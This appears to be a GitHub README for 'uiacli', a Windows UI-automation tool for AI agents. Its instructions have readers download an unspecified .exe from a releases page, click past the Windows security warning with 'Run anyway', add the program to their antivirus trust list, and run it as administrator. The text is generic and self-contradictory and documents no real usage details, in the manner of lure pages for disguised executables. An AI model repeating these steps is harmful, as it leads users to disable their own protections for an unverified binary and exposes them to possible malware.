# 🤖 uiacli - Control Windows apps with intelligent agents

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/dduva2660/uiacli/releases)

uiacli connects artificial intelligence to your screen. It allows computer agents to read and operate Windows programs. You now have the power to automate repetitive tasks across your desktop. The tool uses standard Windows accessibility features to interact with buttons, menus, and input fields. It acts as the bridge between smart models and your daily software.

## 📥 How to get started

You need the application file to begin. Follow these instructions to set up your environment.

1. Visit this [Download Page](https://github.com/dduva2660/uiacli/releases).
2. Look for the Assets section at the bottom of the latest release.
3. Select the file ending in .exe.
4. Save the file to your desktop or a folder of your choice.
5. Double-click the file to launch the program.

Windows may show a security window. Click "More info" and then "Run anyway" if the system prompts you. This occurs because the program performs advanced desktop tasks.

## 🛠️ System requirements

Ensure your computer meets these standards for a stable experience:

* Windows 10 or Windows 11.
* A stable internet connection.
* At least 8GB of system RAM.
* .NET Runtime installed on your machine.

If the program fails to start, download the latest .NET Desktop Runtime from the official Microsoft portal. This framework allows the software to communicate with your Windows elements effectively.

## 🖱️ How it works

The software uses UI Automation. Windows creates a map of every visual element on your screen. This includes text labels, scroll bars, and click targets. uiacli reads this map and translates the information for the AI. 

When you ask the AI to perform a task, the software looks for the specific UI component on your screen. It then performs the click, double-click, or text entry required. This process mimics a human user. You watch the agent operate your mouse and keyboard in real-time. Use this for data entry, file management, or interacting with legacy software that lacks a modern interface.

## ⚙️ Configuration

The application stores settings in a configuration file located in the same folder as the executable. You can edit this file to change how the agent behaves.

* **Mode:** Choose between manual or autonomous control.
* **Speed:** Adjust the delay between clicks if the agent moves too fast for your system to register.
* **Sensitivity:** Set the accuracy threshold for finding buttons on the screen.

Save your changes and restart the application to apply the new settings.

## ⚠️ Troubleshooting common issues

Most issues stem from permission blocks or missing frameworks.

* **The screen does not respond.** Ensure the application has permission to control the mouse. You can run the program as an administrator if your security policy restricts background inputs.
* **The AI misses buttons.** Increase the zoom level of your Windows display to 100% in your system settings. Scaling issues sometimes hide interface elements from the automation service.
* **Antivirus flags.** Some antivirus programs block automation tools. Add uiacli to your list of trusted applications to prevent interference.
* **Missing components.** If you receive an error about missing DLL files, reinstall the .NET Desktop Runtime.

## 📋 Best practices for success

Follow these tips to get the best results from your agent:

* **Keep windows open.** The agent only interacts with windows it can see on the screen. Do not minimize your target applications.
* **Label your fields.** If you build your own software, ensure your buttons and fields have clear names. The agent reads these names to identify what to click.
* **Use clear view.** Clear your desktop of pop-ups or notifications before you start a task. These interfere with the agent's ability to see your buttons.
* **Start simple.** Test the agent with small tasks first. Once you see the agent click buttons and enter text, move to more complex workflows.

## 🛡️ Privacy and scope

This software runs locally on your machine. It does not send screenshots of your desktop to external servers unless you configure it to use a remote cloud-based AI service. By default, your data stays on your computer. You choose which apps the agent sees. You can shut down the agent at any time by pressing the escape key or closing the console window.

## 🔗 Use cases

* **Automate reports.** Open your browser, download a file, and paste it into Excel.
* **Data extraction.** Scrape information from internal tools and save the data to a text file.
* **Repetitive testing.** Verify that your software interface works as expected by running the same steps multiple times.
* **System integration.** Connect two programs that do not have an official sync feature.

## 🚀 Future updates

Development continues on this project to improve compatibility with complex menus and custom UI frameworks. You can track progress on the GitHub repository. Check the releases page often to see if new features or performance boosts are available. Use the issues tab to report bugs or request features. This helps the project grow for every user.